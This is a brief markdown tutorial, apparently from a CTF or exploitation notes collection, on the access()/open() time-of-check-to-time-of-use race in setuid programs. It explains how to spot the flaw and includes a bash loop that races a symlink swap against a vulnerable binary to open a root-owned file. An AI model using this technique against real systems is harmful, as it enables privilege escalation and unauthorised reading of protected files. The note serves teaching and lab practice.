## Access Data Race

access() checks whether the calling process can access the file pathname.

The check is done using the calling process's real UID and GID, rather than the effective IDs.

### Recognition

When data race occur:

- vulnerable program is suid (invok other user authority when execute).

- programm execute access then open on the file.

### Exploit

As a random user you can't open root file. If you try open it throught the vulnerable program, access gonna refuse cause your real id isn't root.

But what if we create a simple file we can access to, and between the call of access and open, create a symlink between your file and the root file ?

Bingo, open() gonna open it cause suid.

:warning: this is not simple as : `touch access.txt ; ./vuln access.txt & ln -fs ~/root_file.txt access.txt`

It may failed cause it depend of speed of execution of both executable (ln & ./vuln);

I suggest creat a simple script to brut force it:

```bash
#!/bin/bash
for i in {1..100}
do
        touch access.txt
        ./vuln access.txt & ln -fs ~/root_file.txt access.txt 2>/dev/null
        rm access.txt
done
```

### Documentation

- [Man access](https://man7.org/linux/man-pages/man2/access.2.html)
- [Access exploit](https://resources.infosecinstitute.com/topic/race-condition-toctou-vulnerability-lab/)
- [Man ln](https://man7.org/linux/man-pages/man1/ln.1.html)

---

[**:arrow_right_hook: Back c**](c.md)
